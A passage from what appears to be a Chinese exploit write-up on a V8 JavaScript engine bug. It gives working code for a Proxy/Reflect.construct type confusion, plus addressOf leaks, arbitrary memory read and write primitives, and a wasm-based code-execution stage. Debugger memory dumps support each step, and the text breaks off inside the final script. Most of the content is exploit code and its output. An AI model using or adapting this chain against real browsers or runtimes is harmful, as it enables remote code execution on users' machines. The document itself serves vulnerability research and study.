<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a, b, c, uint64_array, obj_leaker;</span><br><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Proxy</span>(<span class="title class_">Object</span>, &#123;</span><br><span class="line">    <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable constant_">TRIGGER</span>) &#123;</span><br><span class="line">            a[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">            b = [<span class="number">1.1</span>, <span class="number">2.2</span>];</span><br><span class="line">            c = [<span class="number">6.6</span>];</span><br><span class="line">            uint64_array = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(<span class="number">4</span>);</span><br><span class="line">            uint64_array[<span class="number">0</span>] = <span class="number">0x1111111111111111n</span>;</span><br><span class="line">            uint64_array[<span class="number">1</span>] = <span class="number">0x2222222222222222n</span>;</span><br><span class="line">            uint64_array[<span class="number">2</span>] = <span class="number">0x3333333333333333n</span>;</span><br><span class="line">            uint64_array[<span class="number">3</span>] = <span class="number">0x4444444444444444n</span>;</span><br><span class="line">            obj_leaker = &#123;</span><br><span class="line">                <span class="attr">a</span>: b,</span><br><span class="line">                <span class="attr">b</span>: b,</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>打印一下内存，可以看到除了数组a之外，他们都是排布在相邻内存中的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">0x2c5808a87a71 &lt;JSArray[17]&gt;</span><br><span class="line">0x2c5808a87d85 &lt;JSArray[8160]&gt;</span><br><span class="line">0x2c5808a87dc5 &lt;JSArray[1]&gt;</span><br><span class="line">0x2c5808a87e45 &lt;BigUint64Array map = 0x2c5808240671&gt;</span><br><span class="line">0x2c5808a87e89 &lt;Object map = 0x2c5808f74d31&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/40xg 0x2c5808a87d84</span><br><span class="line">0x2c5808a87d84:	0x080406e908241891	0x00003fc008a87d9d 数组b</span><br><span class="line">0x2c5808a87d94:	0x08211d7500000000	0x0000000408040a3d</span><br><span class="line">0x2c5808a87da4:	0x3ff199999999999a	0x400199999999999a</span><br><span class="line">0x2c5808a87db4:	0x0000000208040a3d	0x401a666666666666</span><br><span class="line">0x2c5808a87dc4:	0x080406e908241891	0x0000000208a87ddd 数组c</span><br><span class="line">0x2c5808a87dd4:	0x08211da10804348d	0x0000000208040a3d</span><br><span class="line">0x2c5808a87de4:	0x401a666666666666	0x080406e908241189</span><br><span class="line">0x2c5808a87df4:	0x00000020080406e9	0x0000000000000000</span><br><span class="line">0x2c5808a87e04:	0x0000000300000000	0x0000000000000000</span><br><span class="line">0x2c5808a87e14:	0x0000000000000000	0x0000004008040489</span><br><span class="line">0x2c5808a87e24:	0x1111111111111111	0x2222222222222222</span><br><span class="line">0x2c5808a87e34:	0x3333333333333333	0x4444444444444444</span><br><span class="line">0x2c5808a87e44:	0x080406e908240671	0x08a87ded08a87e1d BigUint64Array对象 uint64_array</span><br><span class="line">0x2c5808a87e54:	0x0000000000000000	0x0000000000000020</span><br><span class="line">0x2c5808a87e64:	0x0000000000000004	0x00002c5800000007</span><br><span class="line">0x2c5808a87e74:	0x0000000008a87e1d	0x0000000000000000 </span><br><span class="line">0x2c5808a87e84:	0x08f74d3100000000	0x080406e9080406e9 Object obj_leaker</span><br><span class="line">0x2c5808a87e94:	0x08a87d8508a87d85	0x00010001080401c5</span><br></pre></td></tr></table></figure>

<p>我们一步步来看看这些对象都能做到些什么。</p>
<h4 id="obj-leaker-addressOf泄露对象地址"><a href="#obj-leaker-addressOf泄露对象地址" class="headerlink" title="obj_leaker - addressOf泄露对象地址"></a>obj_leaker - addressOf泄露对象地址</h4><p>偏移固定，可以将该对象放置在obj_leaker对象中，然后通过数组b越界读取其地址：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2i</span>(<span class="params">f</span>) &#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i2f</span>(<span class="params">i</span>) &#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    obj_leaker.<span class="property">b</span> = obj;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">f2i</span>(b[<span class="number">30</span>]) &gt;&gt; <span class="number">32n</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> uint64_array_addr = <span class="title function_">addressOf</span>(uint64_array);</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;Uint64 Array Address: &quot;</span> + uint64_array_addr.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">&quot;0&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Uint64 Array Address: 08a8b3ed</span><br><span class="line">0x00ae08a8b3ed &lt;BigUint64Array map = 0xae08240671&gt;</span><br></pre></td></tr></table></figure>

<h4 id="数组c-伪任意地址读写"><a href="#数组c-伪任意地址读写" class="headerlink" title="数组c - 伪任意地址读写"></a>数组c - 伪任意地址读写</h4><p>通过改写数组c的elements指针，可以基本实现任意地址读写：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fakeRead</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    b[<span class="number">5</span>] = <span class="title function_">i2f</span>(addr - <span class="number">0x8n</span> + <span class="number">0x200000000n</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">f2i</span>(c[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeWrite</span>(<span class="params">addr, data</span>) &#123;</span><br><span class="line">    b[<span class="number">5</span>] = <span class="title function_">i2f</span>(addr - <span class="number">0x8n</span> + <span class="number">0x200000000n</span>);</span><br><span class="line">    c[<span class="number">0</span>] = <span class="title function_">i2f</span>(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">fakeRead</span>(uint64_array_addr).<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>));</span><br><span class="line"><span class="title function_">fakeWrite</span>(uint64_array_addr, <span class="title function_">i2f</span>(<span class="number">0x23333333n</span>));</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Uint64 Array Address: 08a90679</span><br><span class="line">080406e908240671</span><br><span class="line">0x26e208a902a5 &lt;JSArray[17]&gt;</span><br><span class="line">0x26e208a905b9 &lt;JSArray[8160]&gt;</span><br><span class="line">0x26e208a905f9 &lt;JSArray[1]&gt;</span><br><span class="line"></span><br><span class="line">Thread 1 &quot;d8&quot; received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line">0x26e208a90678:	0x0000000023333333	0x08a9062108a90651</span><br></pre></td></tr></table></figure>

<h4 id="uint64-array-任意地址读写"><a href="#uint64-array-任意地址读写" class="headerlink" title="uint64_array - 任意地址读写"></a>uint64_array - 任意地址读写</h4><p>BigUint64Array对象类似之前用到过的ArrayBuffer对象，通过改写其指针我们可以实现任意地址读写，其在内存中的布局通过debug打印如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x3608a5f289: [JSTypedArray]</span><br><span class="line"> - map: 0x003608280671 &amp;lt;Map(BIGUINT64ELEMENTS)&amp;gt; [FastProperties]</span><br><span class="line"> - prototype: 0x003608242bc9 &amp;lt;Object map = 0x3608280699&amp;gt;</span><br><span class="line"> - elements: 0x003608a5f261 &amp;lt;ByteArray[32]&amp;gt; [BIGUINT64ELEMENTS]</span><br><span class="line"> - embedder fields: 2</span><br><span class="line"> - buffer: 0x003608a5f231 &amp;lt;ArrayBuffer map = 0x3608281189&amp;gt;</span><br><span class="line"> - byte_offset: 0</span><br><span class="line"> - byte_length: 32</span><br><span class="line"> - length: 4</span><br><span class="line"> - data_ptr: 0x3608a5f268</span><br><span class="line">   - base_pointer: 0x8a5f261</span><br><span class="line">   - external_pointer: 0x3600000007</span><br><span class="line"> - properties: 0x0036080406e9 &amp;lt;FixedArray[0]&amp;gt; &#123;&#125;</span><br><span class="line"> - elements: 0x003608a5f261 &amp;lt;ByteArray[32]&amp;gt; &#123;</span><br><span class="line">           0: 1229782938247303441</span><br><span class="line">           1: 2459565876494606882</span><br><span class="line">           2: 3689348814741910323</span><br><span class="line">           3: 4919131752989213764</span><br><span class="line"> &#125;</span><br><span class="line"> - embedder fields = &#123;</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>其指针由base_pointer和external_pointer两个部分组成，完整的指针由这两个指针相加而成。</p>
<p>在内存中，BigUint64Array布局如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20xg 0x274e08aac024</span><br><span class="line">0x274e08aac024:	0x1111111111111111	0x2222222222222222</span><br><span class="line">0x274e08aac034:	0x3333333333333333	0x4444444444444444</span><br><span class="line">0x274e08aac044:	0x080406e908240671	0x08aabfed08aac01d</span><br><span class="line">0x274e08aac054:	0x0000000000000000	0x0000000000000020</span><br><span class="line">0x274e08aac064:	0x0000000000000004	0x0000274e00000007</span><br><span class="line">0x274e08aac074:	0x0000000008aac01d	0x0000000000000000</span><br><span class="line">0x274e08aac084:	0x08fb4d3100000000	0x080406e9080406e9</span><br><span class="line">0x274e08aac094:	0x08aabf8508aabf85	0x00010001080401c5</span><br><span class="line">0x274e08aac0a4:	0x0804116d00000000	0x0000000808045139</span><br><span class="line">0x274e08aac0b4:	0x080401c500000004	0x0000000000020002</span><br><span class="line">pwndbg&gt; p/x 0x0000000008aac01d+0x0000274e00000007</span><br><span class="line">$2 = 0x274e08aac024</span><br></pre></td></tr></table></figure>

<p>可以发现，external_pointer负责地址的高32位再加个7，base_pointer负责地址的低32位再减个7，所以我们只需要修改base_pointer就可以实现任意地址读写：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="title function_">fakeWrite</span>(base_pointer_addr, addr - <span class="number">0x7n</span> - <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">return</span> uint64_array[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">addr, data</span>) &#123;</span><br><span class="line">    <span class="title function_">fakeWrite</span>(base_pointer_addr, addr - <span class="number">0x7n</span> - <span class="number">0x1n</span>);</span><br><span class="line">    uint64_array[<span class="number">0</span>] = data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>跟之前的一样，通过wasm实现命令执行：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2i</span>(<span class="params">f</span>) &#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i2f</span>(<span class="params">i</span>) &#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable constant_">ITERATIONS</span> = <span class="number">10000</span>;</span><br><span class="line"><span class="variable constant_">TRIGGER</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">empty</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">a, p</span>) &#123;</span><br><span class="line">    a.<span class="title function_">push</span>(<span class="title function_">typeof</span>(<span class="title class_">Reflect</span>.<span class="title function_">construct</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;, <span class="variable language_">arguments</span>, p)) === <span class="title class_">Proxy</span>? <span class="number">1.1</span>: <span class="number">8.063e-320</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a, b, c, uint64_array, obj_leaker;</span><br><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Proxy</span>(<span class="title class_">Object</span>, &#123;</span><br><span class="line">    <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable constant_">TRIGGER</span>) &#123;</span><br><span class="line">            a[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">            b = [<span class="number">1.1</span>, <span class="number">2.2</span>];</span><br><span class="line">            c = [<span class="number">6.6</span>];</span><br><span class="line">            uint64_array = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(<span class="number">4</span>);</span><br><span class="line">            uint64_array[<span class="number">0</span>] = <span class="number">0x1111111111111111n</span>;</span><br><span class="line">            uint64_array[<span class="number">1</span>] = <span class="number">0x2222222222222222n</span>;</span><br><span class="line">            uint64_array[<span class="number">2</span>] = <span class="number">0x3333333333333333n</span>;</span><br><span class="line">            uint64_array[<span class="number">3</span>] = <span class="number">0x4444444444444444n</span>;</span><br><span class="line">            obj_leaker = &#123;</span><br><span class="line">                <span class="attr">a</span>: b,</span><br><span class="line">                <span class="attr">b</span>: b,</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable constant_">ITERATIONS</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> isLastIteration = i == <span class="variable constant_">ITERATIONS</span> - <span class="number">1</span>;</span><br><span class="line">    a = [,,,,,,,,,,,,,, <span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">    a.<span class="title function_">pop</span>();</span><br><span class="line">    a.<span class="title function_">pop</span>();</span><br><span class="line">    a.<span class="title function_">pop</span>();</span><br><span class="line">    <span class="keyword">if</span> (isLastIteration)</span><br><span class="line">        <span class="variable constant_">TRIGGER</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="title function_">f</span>(a, empty);</span><br><span class="line">    <span class="title function_">f</span>(a, empty);</span><br><span class="line">    <span class="title function_">f</span>(a, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (b.<span class="property">length</span> == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">&quot;Write Error&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    obj_leaker.<span class="property">b</span> = obj;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">f2i</span>(b[<span class="number">30</span>]) &gt;&gt; <span class="number">32n</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeRead</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    b[<span class="number">5</span>] = <span class="title function_">i2f</span>(addr - <span class="number">0x8n</span> + <span class="number">0x200000000n</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">f2i</span>(c[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeWrite</span>(<span class="params">addr, data</span>) &#123;</span><br><span class="line">    b[<span class="number">5</span>] = <span class="title function_">i2f</span>(addr - <span class="number">0x8n</span> + <span class="number">0x200000000n</span>);</span><br><span class="line">    c[<span class="number">0</span>] = <span class="title function_">i2f</span>(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> uint64_array_addr = <span class="title function_">addressOf</span>(uint64_array);</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;Uint64 Array Address: &quot;</span> + uint64_array_addr.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">&quot;0&quot;</span>));</span><br><span class="line"><span class="keyword">let</span> base_pointer_addr = uint64_array_addr + <span class="number">0x30n</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;Base Pointer Address: &quot;</span> + base_pointer_addr.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">&quot;0&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="title function_">fakeWrite</span>(base_pointer_addr, addr - <span class="number">0x7n</span> - <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">return</span> uint64_array[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">addr, data</span>) &#123;</span><br><span class="line">    <span class="title function_">fakeWrite</span>(base_pointer_addr, addr - <span class="number">0x7n</span> - <span class="number">0x1n</span>);</span><br><span class="line">    uint64_array[<span class="number">0</span>] = data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getWasmFunc</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line">    <span class="keyword">let</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line">    <span class="keyword">let</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line">    <span class="keyword">return</span> wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">rce</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> wasm_func = <span class="title function_">getWasmFunc</span>();</span><br><span class="line">    <span class="keyword">let</span> wasm_addr = <span class="title function_">addressOf</span>(wasm_func);</span><br><span class="line">    <span class="keyword">let</span> shared_info_addr = <span class="title function_">read</span>(wasm_addr + <span class="number">0x08n</span>) &gt;&gt; <span class="number">32n</span>;</span><br><span class="line">    <span class="keyword">let</span> data_addr = <span class="title function_">read</span>(shared_info_addr) &gt;&gt; <span class="number">32n</span>;</span><br><span class="line">    <span class="keyword">let</span> instance_addr = <span class="title function_">read</span>(data_addr + <span class="number">0x8n</span>) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">    <span class="keyword">let</span> shellcode_addr = <span class="title function_">read</span>(instance_addr + <span class="number">0x68n</span>);</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&quot;Wasm Function Address: &quot;</span> + wasm_addr.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">&quot;0&quot;</span>));</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&quot;Shared Info Address: &quot;</span> + shared_info_addr.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">&quot;0&quot;</span>));</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&quot;Data Address: &quot;</span> + data_addr.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">&quot;0&quot;</span>));</span><br><span class="line">    <span class="title 